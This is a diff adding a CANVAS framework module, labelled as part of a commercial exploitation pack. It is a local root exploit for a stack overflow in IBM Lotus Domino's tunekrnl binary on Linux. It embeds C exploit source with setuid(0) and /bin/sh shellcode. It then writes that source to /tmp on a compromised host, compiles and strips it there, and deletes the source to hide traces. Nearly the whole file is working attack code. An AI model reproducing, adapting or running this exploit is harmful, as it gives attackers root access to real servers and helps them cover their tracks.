@@ -1,0 +1,172 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007
+#
+
+import sys
+
+sys.path.append(".")
+sys.path.append("../../")
+
+from canvasexploit import canvasexploit
+import canvasengine
+
+from exploitutils import *
+from shelllistener import *
+
+from MOSDEFShellServer import MSSgeneric
+from MOSDEF.linuxremoteresolver import x86linuxremoteresolver
+from MOSDEFShellServer.Linux import *
+
+import unixShellNode
+
+NAME = "IBM Lotus Domino TuneKrnl Stack Overflow"
+VERSION = "0.1"
+DESCRIPTION = "IBM Lotus Domino TuneKrnl Stack Overflow < 7.0.2"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Exploit"
+PROPERTY['SITE'] = "Local"
+PROPERTY['ARCH'] = [ ["Linux", "i386"] ]
+
+DOCUMENTATION = {}
+DOCUMENTATION["Date public"] = "2006/11/08"
+DOCUMENTATION["References"] = "http://www.securityfocus.com/bid/20967"
+
+class theexploit (canvasexploit, MSSgeneric, x86linuxremoteresolver, LinuxShellServer):
+    
+	def __init__(self):
+		canvasexploit.__init__(self)
+		self.setInfo(DESCRIPTION)
+		self.name = NAME
+		return
+
+	def tunekrnl_strcpy(self, node, outstr, instr):
+		r = node.shell.strcpy(outstr, instr)
+		if r:
+			self.log("weird strcpy() result: %d" % r)
+			return 0
+		self.log("strcpy ok.")
+		return 1
+
+	def run(self):
+		self.setInfo("%s (in progress)"%(NAME))
+
+		exploit = """
+#include <stdio.h>
+
+#define STACK (0xc0000000-4)
+#define ENV "DOMINO_LINUX_IP_LOCAL_PORT_RANGE"
+#define SIZEBUFF 4192
+#define EIP 4
+#define TUNEKRNL "/opt/ibm/lotus/notes/70010/linux/tunekrnl"
+
+char shellcode[]=
+"\\x31\\xc0\\x31\\xdb\\xb0\\x17\\xcd\\x80" /* setuid (0) */
+"\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b"
+"\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd"
+"\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh -i";
+
+int
+main (int argc, char * argv[])
+{
+	char valenv [sizeof(ENV)+1+SIZEBUFF+EIP+1+sizeof(shellcode)];
+	char buffer[SIZEBUFF+EIP+1+sizeof(shellcode)];
+	char * p_buffer;
+	char * e_argv[] = { TUNEKRNL, NULL };
+	char * e_envp[] = { valenv, shellcode, NULL };
+	int i;
+
+	memset (buffer, 0, sizeof(buffer));
+	p_buffer = buffer;
+
+	memset(p_buffer, 'A', SIZEBUFF-EIP);
+	p_buffer += SIZEBUFF-EIP;
+	printf ("ret: 0x%08x\\n", STACK-sizeof(TUNEKRNL)-sizeof(shellcode));
+	* ((size_t *)p_buffer) = STACK-sizeof(TUNEKRNL)-sizeof(shellcode);
+	p_buffer += EIP;
+	memset(p_buffer, 'B', 4);
+	p_buffer += 4;
+	*p_buffer = '\\0';
+
+	snprintf (valenv, sizeof(valenv), "%s=%s", ENV, buffer);
+
+	execve (e_argv[0], e_argv, e_envp);
+} """
+		
+		for node in self.argsDict["passednodes"]:
+			type = node.nodetype
+			nodename = node.getname()
+			caps = node.capabilities
+			if "linux" not in caps:
+				self.log("Node %s not a Linux node..." % nodename)
+				continue
+
+			self.log("Node %s is a linux node, continuing" % nodename)
+
+			self.node = node
+			self.libc = node.shell.libc
+			self.localfunctions = self.libc.localfunctions.copy()
+			self.arch = node.shell.arch
+			self.localcache = {}
+			self.delim = "#"
+			self.connection = node.shell.connection
+
+			(uid,euid,gid,egid) = node.shell.ids()
+			self.log("ID -a result: %d %d %d %d" % (uid,euid,gid,egid))
+			if uid == 0 or euid == 0:
+				self.log("We are already uid or euid 0, so we don't need to do this on node %s..." % nodename)
+				continue
+
+			O_RDWR = node.shell.libc.getdefine('O_RDWR')
+			O_CREAT = node.shell.libc.getdefine('O_CREAT')
+
+			#self.log("checking if tmpfs mount point exists")
+
+			#tmpfs = [ "/dev/shm", "/lib/init/rw"]
+			#for t in tmpfs:
+			#	data = self.popen2("mount -n|grep 'tmpfs on'|grep %s" % t)
+			#	if len(data) > 0:
+			#		filename = "%s/k.c" % t
+			#		fd = node.shell.open("%s/k.c", O_RDWR|O_CREAT, 0644)
+			#		if fd < 0:
+			#			self.log("couldn't open %s..." % filename)
+			#			continue
+			#		else:
+			#			break
+			
+			#if fd < 0:
+			filename = "/tmp/k.c"
+			bin = "/tmp/k"
+
+			fd = node.shell.open(filename, O_RDWR|O_CREAT, 0644)
+			if fd < 0:
+				self.log("couldn't open %s..." % filename)
+				return 0
+				
+			r = node.shell.write(fd, exploit)
+			if r != 1:
+				self.log("write failed.")
+				return 0
+			self.log("file %s wrote successfully" % filename)
+
+			data = self.popen2("PATH=/usr/bin:$PATH gcc -o %s %s; touch %s; strip %s" % (bin, filename, bin, bin)) # 'touch' in case gcc fails
+			if len(data) > 0:
+				self.log(data)
+
+			self.log("unlink %s..." % filename)
+
+			self.node.unlink(filename)
+
+			self.log ("now run shellshock and then %s...\n" % bin)
+			self.log ("don't forget to unlink %s...\n" % bin)
+
+			return 1
+
+if __name__=="__main__":
+    print "This module is meant to be run only within CANVAS"
+
